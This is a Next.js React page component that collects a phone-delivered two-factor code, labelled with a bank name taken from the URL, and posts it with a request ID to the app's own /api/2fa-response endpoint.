'use client';

import { useState, useEffect, useRef, Suspense } from 'react';
import { useSearchParams } from 'next/navigation';

export const dynamic = 'force-dynamic';

function TwoFactorInputContent() {
  const searchParams = useSearchParams();
  const requestId = searchParams.get('request_id') || 'unknown';
  const bank = searchParams.get('bank') || '2FA';

  const [code, setCode] = useState('');
  const [status, setStatus] = useState<'input' | 'submitting' | 'success' | 'error'>('input');
  const [errorMessage, setErrorMessage] = useState('');
  const inputRef = useRef<HTMLInputElement>(null);

  // Auto-focus on mount
  useEffect(() => {
    if (inputRef.current) {
      inputRef.current.focus();
    }
  }, []);

  // Auto-submit when code reaches expected length
  useEffect(() => {
    if (code.length >= 6 && status === 'input') {
      handleSubmit();
    }
  }, [code]);

  const handleSubmit = async () => {
    if (code.length < 4) {
      setErrorMessage('Code too short');
      return;
    }

    setStatus('submitting');

    try {
      const response = await fetch('/api/2fa-response', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          request_id: requestId,
          code: code
        })
      });

      if (response.ok) {
        setStatus('success');
        // Vibrate for haptic feedback if available
        if ('vibrate' in navigator) {
          navigator.vibrate(100);
        }
      } else {
        const data = await response.json();
        setErrorMessage(data.error || 'Failed to submit');
        setStatus('error');
      }
    } catch (err) {
      setErrorMessage('Network error');
      setStatus('error');
    }
  };

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Only allow digits
    const value = e.target.value.replace(/\D/g, '');
    setCode(value);
    // Clear error on new input
    if (status === 'error') {
      setStatus('input');
      setErrorMessage('');
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && code.length >= 4) {
      handleSubmit();
    }
  };

  return (
    <div className="min-h-screen bg-black flex flex-col items-center justify-center p-4">
      {/* Header */}
      <div className="text-center mb-8">
        <h1 className="text-2xl font-bold text-orange-500 mb-2">
          {bank} Verification
        </h1>
        <p className="text-gray-400 text-sm">
          Enter the code from the phone call
        </p>
      </div>

      {/* Code Input */}
      {status !== 'success' ? (
        <div className="w-full max-w-xs">
          <input
            ref={inputRef}
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={8}
            value={code}
            onChange={handleCodeChange}
            onKeyDown={handleKeyDown}
            disabled={status === 'submitting'}
            className={`
              w-full text-center text-4xl font-mono tracking-[0.5em] p-4
              bg-gray-900 border-2 rounded-lg
              ${status === 'error' ? 'border-red-500' : 'border-orange-500'}
              ${status === 'submitting' ? 'opacity-50' : ''}
              text-white placeholder-gray-600
              focus:outline-none focus:ring-2 focus:ring-orange-500
            `}
            placeholder="••••••"
            autoComplete="one-time-code"
          />

          {/* Error message */}
          {errorMessage && (
            <p className="text-red-500 text-center mt-2">{errorMessage}</p>
          )}

          {/* Submit button (for codes shorter than 6 digits) */}
          {code.length >= 4 && code.length < 6 && status === 'input' && (
            <button
              onClick={handleSubmit}
              className="w-full mt-4 py-3 bg-orange-500 text-black font-bold rounded-lg
                         hover:bg-orange-400 active:bg-orange-600 transition-colors"
            >
              Submit
            </button>
          )}

          {/* Submitting indicator */}
          {status === 'submitting' && (
            <div className="text-center mt-4 text-orange-500">
              <div className="inline-block animate-spin mr-2">⟳</div>
              Submitting...
            </div>
          )}
        </div>
      ) : (
        /* Success state */
        <div className="text-center">
          <div className="text-6xl mb-4">✓</div>
          <p className="text-green-500 text-xl font-bold">Code Received!</p>
          <p className="text-gray-400 mt-2">You can close this page</p>
        </div>
      )}

      {/* Request ID (small, for debugging) */}
      <div className="absolute bottom-4 text-gray-700 text-xs">
        ID: {requestId}
      </div>
    </div>
  );
}

export default function TwoFactorInputPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-black flex items-center justify-center">
        <div className="text-orange-500">Loading...</div>
      </div>
    }>
      <TwoFactorInputContent />
    </Suspense>
  );
}
